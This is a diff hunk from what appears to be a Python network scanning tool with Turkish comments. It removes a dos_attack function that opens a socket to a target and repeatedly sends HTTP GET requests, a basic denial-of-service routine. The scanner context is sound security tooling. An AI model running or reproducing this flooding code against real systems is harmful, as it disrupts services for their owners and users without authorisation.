@@ -44,22 +44,6 @@ def vulnerability_scan(target):
                 for script, output in script_results.items():
                     print(f"\t{script}: {output}")
 
-# DOS saldırısı fonksiyonu
-def dos_attack(target_ip, target_port, num_requests=1000):
-    try:
-        # Hedef IP adresine soket bağlantısı oluştur
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, target_port))
-
-        # Belirtilen sayıda HTTP GET isteği gönder
-        for _ in range(num_requests):
-            s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
-
-        # Soketi kapat
-        s.close()
-        print("DOS attack completed.")
-    except Exception as e:
-        print("Error during DOS attack:", e)
 
 def main():
     print("""
